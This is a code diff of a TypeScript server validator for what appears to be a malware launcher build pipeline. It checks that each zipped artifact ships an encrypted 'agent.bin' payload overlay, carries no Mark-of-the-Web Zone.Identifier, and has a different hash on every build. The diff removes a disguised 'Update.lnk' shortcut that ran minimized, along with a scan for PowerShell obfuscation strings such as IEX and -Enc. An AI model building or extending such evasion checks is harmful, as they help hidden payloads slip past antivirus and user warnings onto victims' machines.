@@ -1,24 +1,20 @@
 /**
  * launcher-validate.ts — WP6 validation report card (server side).
  *
- * Runs the pwsh `New-AgentShortcut.ps1 -Validate` report card (strict .lnk
- * re-parse, zero arguments, relative target, ShowCommand 7, .lnk trigram scan,
- * PE subsystem) and layers the server-side checks on top: zip entry count,
- * Zone.Identifier scan, zip-level trigram scan, auth token not plaintext,
- * payload round-trip (decrypt the stamped overlay and compare with the source
- * payload), and per-build hash diversity vs the previous build.
+ * Server-side validation for the PORTABLE launcher-mode artifact: zip entry
+ * count, Zone.Identifier scan, auth token not plaintext, Launcher.exe PE
+ * subsystem (GUI), per-build launcher hash diversity, and payload round-trip
+ * (decrypt the stamped overlay and compare with the source payload). There is
+ * no .lnk to validate — Launcher.exe is the portable double-click entry.
  */
 
 import * as crypto from "crypto";
 import * as fs from "fs";
-import * as path from "path";
 import * as zlib from "zlib";
-import { spawn } from "child_process";
 import * as launcherPool from "./launcher-pool";
 import { decryptOverlay } from "./launcher-overlay";
 
 export interface ValidateLauncherParams {
-  lnkPath: string;
   launcherPath: string;
   zipPath: string;
   authToken: string;
@@ -27,15 +23,12 @@ export interface ValidateLauncherParams {
   sealIv: Buffer;
   agentBin: Buffer;
   prevLauncherHash: string | null;
-  prevLnkHash: string | null;
 }
 
 export interface ValidateLauncherResult {
   ok: boolean;
   rows: string[];
 }
-
-const PWSH_TIMEOUT_MS = 120000;
 
 function sha256Hex(data: Buffer): string {
   return crypto.createHash("sha256").update(data).digest("hex");
@@ -122,54 +115,6 @@ function readZipEntryInflated(zip: Buffer, localOff: number): Buffer | null {
   }
 }
 
-function runPwshValidate(
-  lnkPath: string,
-  launcherPath: string
-): Promise<{ ok: boolean; output: string }> {
-  return new Promise((resolve) => {
-    try {
-      const script = path.join(__dirname, "New-AgentShortcut.ps1");
-      const args = [
-        script,
-        "-Validate",
-        "-LnkPath",
-        lnkPath,
-        "-LauncherExePath",
-        launcherPath,
-      ];
-      let stdout = "";
-      let stderr = "";
-      const proc = spawn(
-        "pwsh",
-        ["-NoProfile", "-NoLogo", "-File", ...args],
-        { timeout: PWSH_TIMEOUT_MS }
-      );
-      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
-      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
-      proc.on("error", (err: Error) =>
-        resolve({ ok: false, output: err.message })
-      );
-      proc.on("close", (code: number | null) => {
-        if (code === 0)
-          resolve({ ok: true, output: stdout + (stderr ? `\n${stderr}` : "") });
-        else if (code === null)
-          resolve({
-            ok: false,
-            output: `pwsh -Validate timed out after ${PWSH_TIMEOUT_MS / 1000}s`,
-          });
-        else {
-          const tail =
-            stderr.length > 800 ? stderr.slice(-800) : stderr || stdout;
-          resolve({ ok: false, output: tail });
-        }
-      });
-    } catch (err) {
-      const message = err instanceof Error ? err.message : String(err);
-      resolve({ ok: false, output: message });
-    }
-  });
-}
-
 export async function validateLauncherBuild(
   p: ValidateLauncherParams
 ): Promise<ValidateLauncherResult> {
@@ -183,24 +128,7 @@ export async function validateLauncherBuild(
     ok = false;
   };
 
-  // ---- 1. pwsh -Validate report card (.lnk fields + PE subsystem) ----
-  const card = await runPwshValidate(p.lnkPath, p.launcherPath);
-  for (const line of card.output.split("\n")) {
-    const trimmed = line.trim();
-    if (trimmed.startsWith("PASS|") || trimmed.startsWith("FAIL|")) {
-      rows.push(`  ${trimmed}`);
-    }
-  }
-  if (card.ok) {
-    pass(
-      "pwsh -Validate report card",
-      "all .lnk + PE rows PASS (rows echoed above)"
-    );
-  } else {
-    fail("pwsh -Validate report card", card.output.trim().slice(-300));
-  }
-
-  // ---- 2. zip entry count + Zone.Identifier ----
+  // ---- 1. zip entry count + Zone.Identifier ----
   let zip: Buffer;
   try {
     zip = fs.readFileSync(p.zipPath);
@@ -211,7 +139,7 @@ export async function validateLauncherBuild(
     return { ok, rows };
   }
   const entries = readZipEntries(zip);
-  const wantNames = ["Update.lnk", "Launcher.exe", "agent.bin"];
+  const wantNames = ["Launcher.exe", "agent.bin"];
   if (entries.count === wantNames.length) {
     pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
   } else {
@@ -231,38 +159,7 @@ export async function validateLauncherBuild(
     fail("Zone.Identifier entry found", zoneHit.join(", "));
   }
 
-  // ---- 3. trigram scan over the DECOMPRESSED Update.lnk (NOT the raw zip).
-  //      The artifact's Launcher.exe is mostly high-entropy AES-256 ciphertext;
-  //      the RAW compressed bytes randomly match "-Enc"/"IEX" etc. (~30% of
-  //      builds → spurious 502 + dead link). Inflate the human-authored .lnk
-  //      and scan THAT, so the check is deterministic and ciphertext-immune.
-  //      AMSI default stays "none" (real detections are never weakened).
-  const needles = [
-    "-Enc",
-    "EncodedCommand",
-    "IEX",
-    "Invoke-Expression",
-    "FromBase64String",
-  ];
-  const lnkLocal = entries.localOffsets["Update.lnk"];
-  const lnkInflated =
-    typeof lnkLocal === "number" ? readZipEntryInflated(zip, lnkLocal) : null;
-  if (lnkInflated === null || lnkInflated.length === 0) {
-    fail("trigram scan", "could not inflate Update.lnk for scanning");
-  } else {
-    const scanHay = lnkInflated.toString("latin1");
-    const hits = needles.filter((n) => scanHay.includes(n));
-    if (hits.length === 0) {
-      pass(
-        "trigram scan clean",
-        "decompressed Update.lnk: no -Enc/IEX/FromBase64String"
-      );
-    } else {
-      fail("trigram scan", hits.join(", "));
-    }
-  }
-
-  // ---- 4. auth token not plaintext in the zip ----
+  // ---- 3. auth token not plaintext in the zip ----
   // (Raw bytes: the token lives ONLY inside the encrypted overlay, so ANY
   //  plaintext occurrence in the compressed stream is a real leak to catch.)
   const hay = zip.toString("latin1");
@@ -282,16 +179,10 @@ export async function validateLauncherBuild(
 
   // ---- 6. per-build hash diversity ----
   const lzHash = sha256Hex(exe);
-  const lnkHash = sha256Hex(fs.readFileSync(p.lnkPath));
   if (p.prevLauncherHash === null || lzHash !== p.prevLauncherHash) {
     pass("launcher SHA-256 differs from previous build", lzHash.slice(0, 16));
   } else {
     fail("launcher SHA-256 equals previous build!", lzHash.slice(0, 16));
-  }
-  if (p.prevLnkHash === null || lnkHash !== p.prevLnkHash) {
-    pass("Update.lnk SHA-256 differs from previous build", lnkHash.slice(0, 16));
-  } else {
-    fail("Update.lnk SHA-256 equals previous build!", lnkHash.slice(0, 16));
   }
 
   // ---- 7. payload round-trip byte-identical ----
